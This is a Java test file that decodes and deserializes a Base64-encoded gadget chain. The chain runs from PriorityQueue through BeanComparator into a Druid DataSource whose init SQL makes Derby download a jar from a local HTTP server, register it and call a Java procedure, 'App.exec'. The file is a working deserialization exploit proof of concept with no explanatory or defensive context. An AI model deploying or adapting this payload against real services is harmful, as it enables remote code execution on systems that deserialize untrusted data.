import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.Base64;

/**
 * @author by RacerZ
 * @date 2024/2/14.
 */
public class Test {
    public static void main(String[] args) throws Exception {
        String body = "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQACmNvbm5lY3Rpb253BAAAAANzcgAmY29tLmFsaWJhYmEuZHJ1aWQucG9vbC5EcnVpZERhdGFTb3VyY2UAAAAAAAAAAQIAOEkAC2FjdGl2ZUNvdW50SQAKYWN0aXZlUGVha0oADmFjdGl2ZVBlYWtUaW1lWgAJYXN5bmNJbml0WgAQY2hlY2tFeGVjdXRlVGltZUoACmNsb3NlQ291bnRKAA9jbG9zZVRpbWVNaWxsaXNaAAZjbG9zZWRaAAdjbG9zaW5nSgAMY29ubmVjdENvdW50SgARY29ubmVjdEVycm9yQ291bnRJABFjcmVhdGVEaXJlY3RDb3VudEkAD2NyZWF0ZVRhc2tDb3VudEoAEGNyZWF0ZVRhc2tJZFNlZWRKAAxkaXNjYXJkQ291bnRKABFkaXNjYXJkRXJyb3JDb3VudFoABmVuYWJsZVoACWtlZXBBbGl2ZUkAE2tlZXBBbGl2ZUNoZWNrQ291bnRJABhrZWVwQWxpdmVDaGVja0Vycm9yQ291bnRaABlraWxsV2hlblNvY2tldFJlYWRUaW1lb3V0WgARbG9hZFNwaWZpbHRlclNraXBaABJsb2dEaWZmZXJlbnRUaHJlYWRaAA9tYmVhblJlZ2lzdGVyZWRKABNub3RFbXB0eVNpZ25hbENvdW50SgARbm90RW1wdHlXYWl0Q291bnRKABFub3RFbXB0eVdhaXROYW5vc0kAF25vdEVtcHR5V2FpdFRocmVhZENvdW50SQAWbm90RW1wdHlXYWl0VGhyZWFkUGVha0kADHBvb2xpbmdDb3VudEkAC3Bvb2xpbmdQZWFrSgAPcG9vbGluZ1BlYWtUaW1lSgAMcmVjeWNsZUNvdW50SgARcmVjeWNsZUVycm9yQ291bnRKABRyZW1vdmVBYmFuZG9uZWRDb3VudEoACnJlc2V0Q291bnRaAA9yZXNldFN0YXRFbmFibGVaABd1c2VHbG9iYWxEYXRhU291cmNlU3RhdFsAC2Nvbm5lY3Rpb25zdAAvW0xjb20vYWxpYmFiYS9kcnVpZC9wb29sL0RydWlkQ29ubmVjdGlvbkhvbGRlcjtMABZjcmVhdGVDb25uZWN0aW9uVGhyZWFkdAA/TGNvbS9hbGliYWJhL2RydWlkL3Bvb2wvRHJ1aWREYXRhU291cmNlJENyZWF0ZUNvbm5lY3Rpb25UaHJlYWQ7TAAWY3JlYXRlU2NoZWR1bGVyRnV0dXJlc3QAD0xqYXZhL3V0aWwvTWFwO1sAC2NyZWF0ZVRhc2tzdAACW0pMAA5kYXRhU291cmNlU3RhdHQAK0xjb20vYWxpYmFiYS9kcnVpZC9zdGF0L0pkYmNEYXRhU291cmNlU3RhdDtMABdkZXN0cm95Q29ubmVjdGlvblRocmVhZHQAQExjb20vYWxpYmFiYS9kcnVpZC9wb29sL0RydWlkRGF0YVNvdXJjZSREZXN0cm95Q29ubmVjdGlvblRocmVhZDtMABZkZXN0cm95U2NoZWR1bGVyRnV0dXJldAAmTGphdmEvdXRpbC9jb25jdXJyZW50L1NjaGVkdWxlZEZ1dHVyZTtMAAtkZXN0cm95VGFza3QANExjb20vYWxpYmFiYS9kcnVpZC9wb29sL0RydWlkRGF0YVNvdXJjZSREZXN0cm95VGFzaztMABBkaXNhYmxlRXhjZXB0aW9udAAzTGNvbS9hbGliYWJhL2RydWlkL3Bvb2wvRGF0YVNvdXJjZURpc2FibGVFeGNlcHRpb247TAAQZGlzY2FyZEVycm9yTGFzdHQAFUxqYXZhL2xhbmcvVGhyb3dhYmxlO1sAEGV2aWN0Q29ubmVjdGlvbnNxAH4ACkwADmluaXRTdGFja1RyYWNlcQB+AARMAAtpbml0ZWRMYXRjaHQAJUxqYXZhL3V0aWwvY29uY3VycmVudC9Db3VudERvd25MYXRjaDtMAAtpbnN0YW5jZUtleXEAfgAETAAXa2VlcEFsaXZlQ2hlY2tFcnJvckxhc3RxAH4AE1sAFGtlZXBBbGl2ZUNvbm5lY3Rpb25zcQB+AApMAA5sb2dTdGF0c1RocmVhZHQAN0xjb20vYWxpYmFiYS9kcnVpZC9wb29sL0RydWlkRGF0YVNvdXJjZSRMb2dTdGF0c1RocmVhZDtbAA9udWxsQ29ubmVjdGlvbnNxAH4ACnhyAC5jb20uYWxpYmFiYS5kcnVpZC5wb29sLkRydWlkQWJzdHJhY3REYXRhU291cmNlAAAAAAAAAAECAIVaACNhY2Nlc3NUb1VuZGVybHlpbmdDb25uZWN0aW9uQWxsb3dlZFoAGmFzeW5jQ2xvc2VDb25uZWN0aW9uRW5hYmxlWgAYYnJlYWtBZnRlckFjcXVpcmVGYWlsdXJlSgAcY2FjaGVkUHJlcGFyZWRTdGF0ZW1lbnRDb3VudEoAImNhY2hlZFByZXBhcmVkU3RhdGVtZW50RGVsZXRlQ291bnRKAB9jYWNoZWRQcmVwYXJlZFN0YXRlbWVudEhpdENvdW50SgAgY2FjaGVkUHJlcGFyZWRTdGF0ZW1lbnRNaXNzQ291bnRaABJjbGVhckZpbHRlcnNFbmFibGVKABxjbG9zZWRQcmVwYXJlZFN0YXRlbWVudENvdW50SgALY29tbWl0Q291bnRJAA5jb25uZWN0VGltZW91dEkAHGNvbm5lY3Rpb25FcnJvclJldHJ5QXR0ZW1wdHNKABBjb25uZWN0aW9uSWRTZWVkSgALY3JlYXRlQ291bnRJABBjcmVhdGVFcnJvckNvdW50SgAQY3JlYXRlU3RhcnROYW5vc0oADmNyZWF0ZVRpbWVzcGFuSQANY3JlYXRpbmdDb3VudFoAEWRlZmF1bHRBdXRvQ29tbWl0SgAMZGVzdHJveUNvdW50SQARZGlyZWN0Q3JlYXRlQ291bnRKAA1kdXBDbG9zZUNvdW50WgARZHVwQ2xvc2VMb2dFbmFibGVKAAplcnJvckNvdW50SgARZXhlY3V0ZUJhdGNoQ291bnRKAAxleGVjdXRlQ291bnRKABFleGVjdXRlUXVlcnlDb3VudEoAEmV4ZWN1dGVVcGRhdGVDb3VudEkADmZhaWxDb250aW51b3VzSgAYZmFpbENvbnRpbnVvdXNUaW1lTWlsbGlzWgAIZmFpbEZhc3RJAA9mYXRhbEVycm9yQ291bnRJABlmYXRhbEVycm9yQ291bnRMYXN0U2hyaW5rSgACaWRaABJpbml0RXhjZXB0aW9uVGhyb3daABJpbml0R2xvYmFsVmFyaWFudHNaAAxpbml0VmFyaWFudHNaAAZpbml0ZWRJAAtpbml0aWFsU2l6ZVoAB2lzTXlTcWxaAAhpc09yYWNsZUoAGmtlZXBBbGl2ZUJldHdlZW5UaW1lTWlsbGlzWgAsa2VlcENvbm5lY3Rpb25VbmRlcmx5aW5nVHJhbnNhY3Rpb25Jc29sYXRpb25KABlsYXN0Q3JlYXRlRXJyb3JUaW1lTWlsbGlzSgAZbGFzdENyZWF0ZVN0YXJ0VGltZU1pbGxpc0oAE2xhc3RFcnJvclRpbWVNaWxsaXNKABhsYXN0RmF0YWxFcnJvclRpbWVNaWxsaXNaAAxsb2dBYmFuZG9uZWRJAAltYXhBY3RpdmVJABJtYXhDcmVhdGVUYXNrQ291bnRKABptYXhFdmljdGFibGVJZGxlVGltZU1pbGxpc0kAB21heElkbGVJABltYXhPcGVuUHJlcGFyZWRTdGF0ZW1lbnRzSQApbWF4UG9vbFByZXBhcmVkU3RhdGVtZW50UGVyQ29ubmVjdGlvblNpemVKAAdtYXhXYWl0SQASbWF4V2FpdFRocmVhZENvdW50SgAObWV0YURhdGFJZFNlZWRKABptaW5FdmljdGFibGVJZGxlVGltZU1pbGxpc0kAB21pbklkbGVaAA9uZXRUaW1lb3V0RXJyb3JJABhub3RGdWxsVGltZW91dFJldHJ5Q291bnRJABZudW1UZXN0c1BlckV2aWN0aW9uUnVuWgAMb25GYXRhbEVycm9ySQAVb25GYXRhbEVycm9yTWF4QWN0aXZlSgAOcGh5TWF4VXNlQ291bnRKABBwaHlUaW1lb3V0TWlsbGlzWgAWcG9vbFByZXBhcmVkU3RhdGVtZW50c0oAFnByZXBhcmVkU3RhdGVtZW50Q291bnRJAAxxdWVyeVRpbWVvdXRaAA9yZW1vdmVBYmFuZG9uZWRKABxyZW1vdmVBYmFuZG9uZWRUaW1lb3V0TWlsbGlzSgAPcmVzdWx0U2V0SWRTZWVkSgANcm9sbGJhY2tDb3VudFoAF3NoYXJlUHJlcGFyZWRTdGF0ZW1lbnRzSQANc29ja2V0VGltZW91dEoAFXN0YXJ0VHJhbnNhY3Rpb25Db3VudEoAD3N0YXRlbWVudElkU2VlZFoADHRlc3RPbkJvcnJvd1oADHRlc3RPblJldHVybloADXRlc3RXaGlsZUlkbGVKAB10aW1lQmV0d2VlbkNvbm5lY3RFcnJvck1pbGxpc0oAHXRpbWVCZXR3ZWVuRXZpY3Rpb25SdW5zTWlsbGlzSgAZdGltZUJldHdlZW5Mb2dTdGF0c01pbGxpc0oAEXRyYW5zYWN0aW9uSWRTZWVkSQAXdHJhbnNhY3Rpb25RdWVyeVRpbWVvdXRKABp0cmFuc2FjdGlvblRocmVzaG9sZE1pbGxpc1oAFHVzZUxvY2FsU2Vzc2lvblN0YXRlWgAWdXNlT3JhY2xlSW1wbGljaXRDYWNoZVoADXVzZVBpbmdNZXRob2RJABZ2YWxpZGF0aW9uUXVlcnlUaW1lb3V0TAAUYWN0aXZlQ29ubmVjdGlvbkxvY2t0ACpMamF2YS91dGlsL2NvbmN1cnJlbnQvbG9ja3MvUmVlbnRyYW50TG9jaztMABFhY3RpdmVDb25uZWN0aW9uc3EAfgAMTAARY29ubmVjdFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7TAARY29ubmVjdFRpbWVvdXRTdHJxAH4ABEwAEmNvbm5lY3Rpb25Jbml0U3Fsc3QAEExqYXZhL3V0aWwvTGlzdDtMAAtjcmVhdGVFcnJvcnEAfgATTAAPY3JlYXRlU2NoZWR1bGVydAAvTGphdmEvdXRpbC9jb25jdXJyZW50L1NjaGVkdWxlZEV4ZWN1dG9yU2VydmljZTtMAAtjcmVhdGVkVGltZXQAEExqYXZhL3V0aWwvRGF0ZTtMAApkYlR5cGVOYW1lcQB+AARMAA5kZWZhdWx0Q2F0YWxvZ3EAfgAETAAPZGVmYXVsdFJlYWRPbmx5dAATTGphdmEvbGFuZy9Cb29sZWFuO0wAG2RlZmF1bHRUcmFuc2FjdGlvbklzb2xhdGlvbnQAE0xqYXZhL2xhbmcvSW50ZWdlcjtMABBkZXN0cm95U2NoZWR1bGVycQB+ABpMAAZkcml2ZXJ0ABFMamF2YS9zcWwvRHJpdmVyO0wAC2RyaXZlckNsYXNzcQB+AARMABFkcml2ZXJDbGFzc0xvYWRlcnQAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7TAAFZW1wdHl0ACZMamF2YS91dGlsL2NvbmN1cnJlbnQvbG9ja3MvQ29uZGl0aW9uO0wAD2V4Y2VwdGlvblNvcnRlcnQAKExjb20vYWxpYmFiYS9kcnVpZC9wb29sL0V4Y2VwdGlvblNvcnRlcjtMAAtmaWx0ZXJDaGFpbnQAKkxjb20vYWxpYmFiYS9kcnVpZC9maWx0ZXIvRmlsdGVyQ2hhaW5JbXBsO0wAB2ZpbHRlcnNxAH4AGUwACmluaXRlZFRpbWVxAH4AG0wAB2pkYmNVcmxxAH4ABEwADmtlZXBBbGl2ZUVycm9ycQB+ABNMAA9sYXN0Q3JlYXRlRXJyb3JxAH4AE0wACWxhc3RFcnJvcnEAfgATTAAObGFzdEZhdGFsRXJyb3JxAH4AE0wAEWxhc3RGYXRhbEVycm9yU3FscQB+AARMAARsb2NrcQB+ABdMAAlsb2dXcml0ZXJ0ABVMamF2YS9pby9QcmludFdyaXRlcjtMAARuYW1lcQB+AARMABJuZXRUaW1lb3V0RXhlY3V0b3J0AB9MamF2YS91dGlsL2NvbmN1cnJlbnQvRXhlY3V0b3I7TAAIbm90RW1wdHlxAH4AIEwACm9iamVjdE5hbWV0AB1MamF2YXgvbWFuYWdlbWVudC9PYmplY3ROYW1lO0wACHBhc3N3b3JkcQB+AARMABBwYXNzd29yZENhbGxiYWNrdAAvTGphdmF4L3NlY3VyaXR5L2F1dGgvY2FsbGJhY2svUGFzc3dvcmRDYWxsYmFjaztMAA9zb2NrZXRUaW1lb3V0U3JxAH4ABEwACnN0YXRMb2dnZXJ0ADJMY29tL2FsaWJhYmEvZHJ1aWQvcG9vbC9EcnVpZERhdGFTb3VyY2VTdGF0TG9nZ2VyO0wAFHRyYW5zYWN0aW9uSGlzdG9ncmFtdAAiTGNvbS9hbGliYWJhL2RydWlkL3V0aWwvSGlzdG9ncmFtO0wADXVzZVVuZmFpckxvY2txAH4AHEwADHVzZXJDYWxsYmFja3QAK0xqYXZheC9zZWN1cml0eS9hdXRoL2NhbGxiYWNrL05hbWVDYWxsYmFjaztMAAh1c2VybmFtZXEAfgAETAAWdmFsaWRDb25uZWN0aW9uQ2hlY2tlcnQAL0xjb20vYWxpYmFiYS9kcnVpZC9wb29sL1ZhbGlkQ29ubmVjdGlvbkNoZWNrZXI7TAAPdmFsaWRhdGlvblF1ZXJ5cQB+AAR4cAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAACcQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAEAAAAAAAAAAdTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAADAAAAAAGAhYAAAAAI/////wAAAAr///////////////8AAAAAAAE4gAAAAAAAG3dAAAAAAAAAAAAAAAAAAwAAAAAA/////////////////////wAAAAAAAAAAAAAAAAAAAAAAAAAEk+AAAAAAAADDUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE4gAAABAAAAAAAAAfQAAAAAAADqYAAAAAAAAAAAAAAAAAAA6mAAAAAAAAAAAAAAAAABAQD/////c3IAKGphdmEudXRpbC5jb25jdXJyZW50LmxvY2tzLlJlZW50cmFudExvY2tmVagsLMhq6wIAAUwABHN5bmN0AC9MamF2YS91dGlsL2NvbmN1cnJlbnQvbG9ja3MvUmVlbnRyYW50TG9jayRTeW5jO3hwc3IANGphdmEudXRpbC5jb25jdXJyZW50LmxvY2tzLlJlZW50cmFudExvY2skTm9uZmFpclN5bmNliDLnU3u/CwIAAHhyAC1qYXZhLnV0aWwuY29uY3VycmVudC5sb2Nrcy5SZWVudHJhbnRMb2NrJFN5bmO4HqKUqkRafAIAAHhyADVqYXZhLnV0aWwuY29uY3VycmVudC5sb2Nrcy5BYnN0cmFjdFF1ZXVlZFN5bmNocm9uaXplcmZVqEN1P1LjAgABSQAFc3RhdGV4cgA2amF2YS51dGlsLmNvbmN1cnJlbnQubG9ja3MuQWJzdHJhY3RPd25hYmxlU3luY2hyb25pemVyM9+vua1tb6kCAAB4cAAAAABzcgAZamF2YS51dGlsLklkZW50aXR5SGFzaE1hcHGiZQEz8umAAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhzcgAUamF2YS51dGlsLlByb3BlcnRpZXM5EtB6cDY+mAIAAUwACGRlZmF1bHRzcQB+ABh4cgATamF2YS51dGlsLkhhc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAJ3CAAAAAMAAAAAeHBwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAR3BAAAAAR0AEtDQUxMIFNRTEouSU5TVEFMTF9KQVIoJ2h0dHA6Ly8xMjcuMC4wLjE6ODAwMC9oZWxwZXIuamFyJywgJ0FQUC5TYW1wbGU0JywgMCl0AFVDQUxMIFNZU0NTX1VUSUwuU1lTQ1NfU0VUX0RBVEFCQVNFX1BST1BFUlRZKCdkZXJieS5kYXRhYmFzZS5jbGFzc3BhdGgnLCdBUFAuU2FtcGxlNCcpdABzQ1JFQVRFIFBST0NFRFVSRSBTQUxFUy5UT1RBTF9SRVZFTlVFUzIoKSBQQVJBTUVURVIgU1RZTEUgSkFWQSBSRUFEUyBTUUwgREFUQSBMQU5HVUFHRSBKQVZBIEVYVEVSTkFMIE5BTUUgJ0FwcC5leGVjJ3QAHENBTEwgU0FMRVMuVE9UQUxfUkVWRU5VRVMyKCl4cHBzcgAOamF2YS51dGlsLkRhdGVoaoEBS1l0GQMAAHhwdwgAAAGNp69Vf3hwcHBwcHB0ACRvcmcuYXBhY2hlLmRlcmJ5LmpkYmMuRW1iZWRkZWREcml2ZXJwc3IARWphdmEudXRpbC5jb25jdXJyZW50LmxvY2tzLkFic3RyYWN0UXVldWVkU3luY2hyb25pemVyJENvbmRpdGlvbk9iamVjdBBK1QWFXGrrAgABTAAGdGhpcyQwdAA3TGphdmEvdXRpbC9jb25jdXJyZW50L2xvY2tzL0Fic3RyYWN0UXVldWVkU3luY2hyb25pemVyO3hwc3EAfgAvAAAAAHBwc3IAKWphdmEudXRpbC5jb25jdXJyZW50LkNvcHlPbldyaXRlQXJyYXlMaXN0eF2f1UarkMMDAAB4cHcEAAAAAHhwdAAcamRiYzpkZXJieTp3ZWJkYjtjcmVhdGU9dHJ1ZXBwcHBwc3EAfgAscQB+AEVwcHBzcQB+AEJxAH4ARXBwcHBwcHBwcHBwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAcHBzcgAmamF2YS51dGlsLmNvbmN1cnJlbnQuQ29uY3VycmVudEhhc2hNYXBkmd4SnYcpPQMAA0kAC3NlZ21lbnRNYXNrSQAMc2VnbWVudFNoaWZ0WwAIc2VnbWVudHN0ADFbTGphdmEvdXRpbC9jb25jdXJyZW50L0NvbmN1cnJlbnRIYXNoTWFwJFNlZ21lbnQ7eHAAAAAPAAAAHHVyADFbTGphdmEudXRpbC5jb25jdXJyZW50LkNvbmN1cnJlbnRIYXNoTWFwJFNlZ21lbnQ7Unc/QTKbOXQCAAB4cAAAABBzcgAuamF2YS51dGlsLmNvbmN1cnJlbnQuQ29uY3VycmVudEhhc2hNYXAkU2VnbWVudB82TJBYkyk9AgABRgAKbG9hZEZhY3RvcnhxAH4ALHNxAH4ALwAAAAA/QAAAc3EAfgBQc3EAfgAvAAAAAD9AAABzcQB+AFBzcQB+AC8AAAAAP0AAAHNxAH4AUHNxAH4ALwAAAAA/QAAAc3EAfgBQc3EAfgAvAAAAAD9AAABzcQB+AFBzcQB+AC8AAAAAP0AAAHNxAH4AUHNxAH4ALwAAAAA/QAAAc3EAfgBQc3EAfgAvAAAAAD9AAABzcQB+AFBzcQB+AC8AAAAAP0AAAHNxAH4AUHNxAH4ALwAAAAA/QAAAc3EAfgBQc3EAfgAvAAAAAD9AAABzcQB+AFBzcQB+AC8AAAAAP0AAAHNxAH4AUHNxAH4ALwAAAAA/QAAAc3EAfgBQc3EAfgAvAAAAAD9AAABzcQB+AFBzcQB+AC8AAAAAP0AAAHNxAH4AUHNxAH4ALwAAAAA/QAAAcHB4cHBwcHBwcHBwcHBwcHBwcQB+ACt4";
        byte[] data = Base64.getDecoder().decode(body);
        ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(data));

        try {
            input.readObject();
        } catch (Throwable var7) {
            try {
                input.close();
            } catch (Throwable var6) {
                var7.addSuppressed(var6);
            }

            throw var7;
        }

        input.close();
    }
}
